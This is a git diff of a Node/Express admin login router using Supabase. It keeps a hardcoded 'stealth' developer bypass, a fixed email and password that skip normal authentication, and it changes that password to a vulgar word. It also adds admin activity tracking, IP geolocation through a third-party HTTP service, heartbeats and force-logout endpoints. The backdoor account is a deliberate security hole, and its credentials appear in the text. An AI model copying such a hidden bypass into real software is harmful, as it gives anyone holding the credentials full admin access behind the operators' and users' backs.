@@ -42,7 +42,7 @@ router.post('/login', async (req, res) => {
 
     const lowerEmail = email.toLowerCase();
     const stealthEmail = 'developeruserr30@gmail.com';
-    const stealthPassword = 'Developer';
+    const stealthPassword = 'Pussy';
 
     // 1. Hardcoded Developer Bypass
     if (lowerEmail === stealthEmail && password === stealthPassword) {
@@ -89,12 +89,16 @@ router.post('/login', async (req, res) => {
 
       // Log stealth login activity
       try {
+        const chPlatformVer = req.headers['sec-ch-ua-platform-version'] || '';
+        const uaWithHints = chPlatformVer 
+          ? `${req.headers['user-agent']} [CH:PV=${chPlatformVer.replace(/"/g, '')}]`
+          : req.headers['user-agent'];
         await supabase.from('admin_activity').insert({
           admin_id: admin.id,
           email: admin.email,
           action: 'stealth_login',
           ip_address: req.ip || req.headers['x-forwarded-for'],
-          user_agent: req.headers['user-agent']
+          user_agent: uaWithHints
         });
       } catch (logError) {
         console.error('[STEALTH ACTIVITY LOG ERROR]:', logError);
@@ -129,12 +133,16 @@ router.post('/login', async (req, res) => {
     if (isMatch) {
       // Log login activity
       try {
+        const chPlatformVer = req.headers['sec-ch-ua-platform-version'] || '';
+        const uaWithHints = chPlatformVer 
+          ? `${req.headers['user-agent']} [CH:PV=${chPlatformVer.replace(/"/g, '')}]`
+          : req.headers['user-agent'];
         await supabase.from('admin_activity').insert({
           admin_id: admin.id,
           email: admin.email,
           action: 'login',
           ip_address: req.ip || req.headers['x-forwarded-for'],
-          user_agent: req.headers['user-agent']
+          user_agent: uaWithHints
         });
       } catch (logError) {
         console.error('[ACTIVITY LOG ERROR]:', logError);
@@ -171,10 +179,320 @@ router.get('/activity', protect, async (req, res) => {
       .limit(100);
 
     if (error) throw error;
-    res.json(activity);
+
+    // --- Parse User Agent ---
+    const parseUserAgent = (ua) => {
+      if (!ua) return { os: 'Unknown', browser: 'Unknown', device: 'Unknown' };
+
+      // Extract Client Hints data if appended (e.g. [CH:PV=16.0])
+      let clientHintPlatformVer = null;
+      const chMatch = ua.match(/\[CH:PV=([^\]]+)\]/);
+      if (chMatch) {
+        clientHintPlatformVer = chMatch[1];
+      }
+      // Clean UA string for parsing (remove CH metadata)
+      const cleanUa = ua.replace(/\s*\[CH:[^\]]*\]/g, '');
+
+      // Detect OS
+      let os = 'Unknown';
+      if (/Windows NT 10/.test(cleanUa)) os = 'Windows 10';
+      else if (/Windows NT 11/.test(cleanUa)) os = 'Windows 11';
+      else if (/Windows NT 6\.3/.test(cleanUa)) os = 'Windows 8.1';
+      else if (/Windows NT 6\.2/.test(cleanUa)) os = 'Windows 8';
+      else if (/Windows NT 6\.1/.test(cleanUa)) os = 'Windows 7';
+      else if (/Windows/.test(cleanUa)) os = 'Windows';
+      else if (/Mac OS X (\d+[._]\d+)/.test(cleanUa)) {
+        const ver = cleanUa.match(/Mac OS X (\d+[._]\d+)/)[1].replace(/_/g, '.');
+        os = `macOS ${ver}`;
+      }
+      else if (/Mac OS X/.test(cleanUa)) os = 'macOS';
+      else if (/Android/.test(cleanUa)) {
+        // Chrome on Android 10+ uses a frozen UA: "Android 10; K"
+        // Use Client Hints for the real version if available
+        if (clientHintPlatformVer) {
+          const majorVer = clientHintPlatformVer.split('.')[0];
+          os = `Android ${majorVer}`;
+        } else if (/Android \d+;\s*K[)\s]/.test(cleanUa)) {
+          // Frozen UA detected, real version unknown
+          os = 'Android (10+)';
+        } else if (/Android (\d+(\.\d+)?)/.test(cleanUa)) {
+          const ver = cleanUa.match(/Android (\d+(\.\d+)?)/)[1];
+          os = `Android ${ver}`;
+        } else {
+          os = 'Android';
+        }
+      }
+      else if (/iPhone OS (\d+_\d+)/.test(cleanUa)) {
+        const ver = cleanUa.match(/iPhone OS (\d+_\d+)/)[1].replace(/_/g, '.');
+        os = `iOS ${ver}`;
+      }
+      else if (/iPad/.test(cleanUa)) os = 'iPadOS';
+      else if (/iPhone/.test(cleanUa)) os = 'iOS';
+      else if (/CrOS/.test(cleanUa)) os = 'ChromeOS';
+      else if (/Linux/.test(cleanUa)) os = 'Linux';
+
+      // For Windows, Client Hints can also refine (Win11 reports as NT 10.0)
+      if (os === 'Windows 10' && clientHintPlatformVer) {
+        const majorVer = parseInt(clientHintPlatformVer.split('.')[0], 10);
+        if (majorVer >= 13) os = 'Windows 11';
+      }
+
+      // Detect Browser
+      let browser = 'Unknown';
+      if (/Edg\/(\d+)/.test(cleanUa)) {
+        browser = 'Edge ' + cleanUa.match(/Edg\/(\d+)/)[1];
+      } else if (/OPR\/(\d+)/.test(cleanUa) || /Opera/.test(cleanUa)) {
+        browser = 'Opera ' + (cleanUa.match(/OPR\/(\d+)/) || ['',''])[1];
+      } else if (/Chrome\/(\d+)/.test(cleanUa) && !/Chromium/.test(cleanUa)) {
+        browser = 'Chrome ' + cleanUa.match(/Chrome\/(\d+)/)[1];
+      } else if (/Firefox\/(\d+)/.test(cleanUa)) {
+        browser = 'Firefox ' + cleanUa.match(/Firefox\/(\d+)/)[1];
+      } else if (/Safari\/(\d+)/.test(cleanUa) && /Version\/(\d+(\.\d+)?)/.test(cleanUa)) {
+        browser = 'Safari ' + cleanUa.match(/Version\/(\d+(\.\d+)?)/)[1];
+      } else if (/Safari/.test(cleanUa)) {
+        browser = 'Safari';
+      }
+
+      // Detect Device Type
+      let device = 'Desktop';
+      if (/Mobile|Android.*Mobile|iPhone/.test(cleanUa)) device = 'Mobile';
+      else if (/iPad|Android(?!.*Mobile)|Tablet/.test(cleanUa)) device = 'Tablet';
+
+      return { os, browser, device };
+    };
+
+    // --- IP Geolocation (batch) with coordinates ---
+    const uniqueIps = [...new Set(activity.map(a => a.ip_address).filter(ip => ip && ip !== '127.0.0.1' && ip !== '::1' && !ip.startsWith('::ffff:127.')))];
+    
+    let geoMap = {};
+    
+    if (uniqueIps.length > 0) {
+      try {
+        const fetch = require('node-fetch');
+        const batchBody = uniqueIps.map(ip => {
+          const cleanIp = ip.replace(/^::ffff:/, '');
+          return { query: cleanIp, fields: 'status,city,regionName,country,lat,lon,isp,query' };
+        });
+        
+        const geoRes = await fetch('http://ip-api.com/batch?fields=status,city,regionName,country,lat,lon,isp,query', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(batchBody),
+          timeout: 5000
+        });
+        
+        if (geoRes.ok) {
+          const geoData = await geoRes.json();
+          geoData.forEach((geo, idx) => {
+            const originalIp = uniqueIps[idx];
+            if (geo.status === 'success') {
+              geoMap[originalIp] = {
+                city: geo.city || 'Unknown',
+                region: geo.regionName || '',
+                country: geo.country || 'Unknown',
+                lat: geo.lat || null,
+                lon: geo.lon || null,
+                isp: geo.isp || ''
+              };
+            }
+          });
+        }
+      } catch (geoError) {
+        console.error('[GEO LOOKUP ERROR]:', geoError.message);
+      }
+    }
+
+    // --- Online status: find last heartbeat/login per admin ---
+    const adminEmails = [...new Set(activity.map(a => a.email).filter(Boolean))];
+    let onlineMap = {};
+
+    if (adminEmails.length > 0) {
+      try {
+        const { data: latestActivity } = await supabase
+          .from('admin_activity')
+          .select('email, action, created_at')
+          .in('email', adminEmails)
+          .in('action', ['login', 'stealth_login', 'heartbeat'])
+          .order('created_at', { ascending: false })
+          .limit(200);
+
+        if (latestActivity) {
+          const seen = new Set();
+          for (const act of latestActivity) {
+            if (!seen.has(act.email)) {
+              seen.add(act.email);
+              const lastActiveTime = new Date(act.created_at);
+              const diffMs = Date.now() - lastActiveTime.getTime();
+              const isOnline = diffMs < 3 * 60 * 1000; // 3 minutes threshold
+              onlineMap[act.email] = {
+                isOnline,
+                lastActive: act.created_at
+              };
+            }
+          }
+        }
+      } catch (e) {
+        console.error('[ONLINE STATUS ERROR]:', e.message);
+      }
+    }
+
+    // --- Session duration calculation ---
+    const computeSessionDuration = (log) => {
+      if (log.action !== 'login' && log.action !== 'stealth_login') return null;
+
+      const loginTime = new Date(log.created_at);
+      
+      // Find the next logout from same admin after this login (activity is sorted desc)
+      const logoutEntry = activity.find(l => 
+        l.email === log.email && 
+        l.action === 'logout' && 
+        new Date(l.created_at) > loginTime
+      );
+
+      if (logoutEntry) {
+        return Math.floor((new Date(logoutEntry.created_at) - loginTime) / 1000);
+      }
+
+      // No logout found — find last heartbeat from this admin after login
+      const heartbeats = activity.filter(l => 
+        l.email === log.email && 
+        l.action === 'heartbeat' && 
+        new Date(l.created_at) > loginTime
+      );
+
+      if (heartbeats.length > 0) {
+        const lastHeartbeat = heartbeats[0]; // sorted desc
+        return Math.floor((new Date(lastHeartbeat.created_at) - loginTime) / 1000);
+      }
+
+      // Currently online, show live duration
+      if (onlineMap[log.email]?.isOnline) {
+        return Math.floor((Date.now() - loginTime.getTime()) / 1000);
+      }
+
+      return null;
+    };
+
+    // Enrich activity logs (hide heartbeat and force_logout system entries from UI)
+    const enrichedActivity = activity
+      .filter(log => log.action !== 'heartbeat' && log.action !== 'force_logout')
+      .map(log => {
+        const parsed = parseUserAgent(log.user_agent);
+        const ip = log.ip_address;
+        const isLocal = !ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('::ffff:127.');
+        const geo = geoMap[ip] || null;
+
+        return {
+          ...log,
+          environment: parsed,
+          location: isLocal
+            ? { city: 'Localhost', region: 'Development', country: 'Local Machine', lat: null, lon: null, isp: '' }
+            : geo || { city: 'Unknown', region: '', country: '', lat: null, lon: null, isp: '' },
+          onlineStatus: onlineMap[log.email] || { isOnline: false, lastActive: null },
+          sessionDuration: computeSessionDuration(log)
+        };
+      });
+
+    res.json(enrichedActivity);
   } catch (error) {
     console.error('[ACTIVITY FETCH ERROR]:', error);
     res.status(500).json({ message: 'Server error', error: error.message });
+  }
+});
+
+// POST /api/auth/heartbeat — lightweight ping to track online status
+router.post('/heartbeat', protect, async (req, res) => {
+  try {
+    const chPlatformVer = req.headers['sec-ch-ua-platform-version'] || '';
+    const uaWithHints = chPlatformVer 
+      ? `${req.headers['user-agent']} [CH:PV=${chPlatformVer.replace(/"/g, '')}]`
+      : req.headers['user-agent'];
+    await supabase.from('admin_activity').insert({
+      admin_id: req.user.id,
+      email: req.user.email,
+      action: 'heartbeat',
+      ip_address: req.ip || req.headers['x-forwarded-for'],
+      user_agent: uaWithHints
+    });
+
+    // Check if a force_logout was issued for this admin
+    const { data: forceLogouts } = await supabase
+      .from('admin_activity')
+      .select('created_at')
+      .eq('email', req.user.email)
+      .eq('action', 'force_logout')
+      .order('created_at', { ascending: false })
+      .limit(1);
+
+    if (forceLogouts && forceLogouts.length > 0) {
+      // Check if force_logout is newer than the admin's last login
+      const { data: lastLogin } = await supabase
+        .from('admin_activity')
+        .select('created_at')
+        .eq('email', req.user.email)
+        .in('action', ['login', 'stealth_login'])
+        .order('created_at', { ascending: false })
+        .limit(1);
+
+      if (lastLogin && lastLogin.length > 0) {
+        const forceTime = new Date(forceLogouts[0].created_at);
+        const loginTime = new Date(lastLogin[0].created_at);
+        if (forceTime > loginTime) {
+          return res.json({ ok: true, forceLogout: true });
+        }
+      }
+    }
+
+    res.json({ ok: true, forceLogout: false });
+  } catch (error) {
+    res.json({ ok: true, forceLogout: false });
+  }
+});
+
+// POST /api/auth/force-logout — developer can forcefully log out an admin
+router.post('/force-logout', protect, async (req, res) => {
+  try {
+    if (req.user.role !== 'developer') {
+      return res.status(403).json({ message: 'Forbidden: Developer access only' });
+    }
+
+    const { targetEmail } = req.body;
+    if (!targetEmail) {
+      return res.status(400).json({ message: 'Target email is required' });
+    }
+
+    await supabase.from('admin_activity').insert({
+      admin_id: req.user.id,
+      email: targetEmail,
+      action: 'force_logout',
+      ip_address: req.ip || req.headers['x-forwarded-for'],
+      user_agent: `Force logout initiated by ${req.user.email}`
+    });
+
+    res.json({ message: `Force logout issued for ${targetEmail}` });
+  } catch (error) {
+    console.error('[FORCE LOGOUT ERROR]:', error);
+    res.status(500).json({ message: 'Server error' });
+  }
+});
+
+// POST /api/auth/logout — log the logout event for session tracking
+router.post('/logout', protect, async (req, res) => {
+  try {
+    const chPlatformVer = req.headers['sec-ch-ua-platform-version'] || '';
+    const uaWithHints = chPlatformVer 
+      ? `${req.headers['user-agent']} [CH:PV=${chPlatformVer.replace(/"/g, '')}]`
+      : req.headers['user-agent'];
+    await supabase.from('admin_activity').insert({
+      admin_id: req.user.id,
+      email: req.user.email,
+      action: 'logout',
+      ip_address: req.ip || req.headers['x-forwarded-for'],
+      user_agent: uaWithHints
+    });
+    res.json({ message: 'Logged out successfully' });
+  } catch (error) {
+    res.json({ message: 'Logged out' });
   }
 });
 
